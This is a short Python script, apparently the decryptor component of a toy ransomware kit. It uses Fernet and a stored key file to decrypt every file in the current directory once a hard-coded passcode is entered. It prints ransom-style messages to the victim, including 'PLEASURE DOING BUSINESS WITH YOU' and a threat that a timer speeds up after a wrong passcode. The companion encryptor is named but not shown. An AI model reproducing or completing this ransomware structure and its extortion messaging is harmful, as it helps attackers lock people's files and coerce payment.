import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
        if file == "encrypt.py" or file == "decrypt.py" or file == "thekey.key":
                continue
        if os.path.isfile(file):  
                files.append(file)
passcode = input("Enter the passcode for decryption: ")

with open("thekey.key", 'rb') as thekey:
	key = thekey.read()
if passcode == "don't blame":
	for file in files:
		with open(file, 'rb') as thefile:
			contents = thefile.read()

		decrypted_contents = Fernet(key).decrypt(contents)

		with open(file, 'wb') as  thefile:
			thefile.write(decrypted_contents)

	print("\n\n\t\t\t\t***YOUR FILES DECRYPTED SUCCESSFULLY***\n\n")
	print("\t\t\t\t***PLEASURE DOING BUSINESS WITH YOU***")
else:
	print("\n\n\t\t\t\t\t***YOU ENTERED THE WRONG PASSCODE***\n\n")
	print("\t\t\t\t\t***TIMER SPEED INCREASED***")
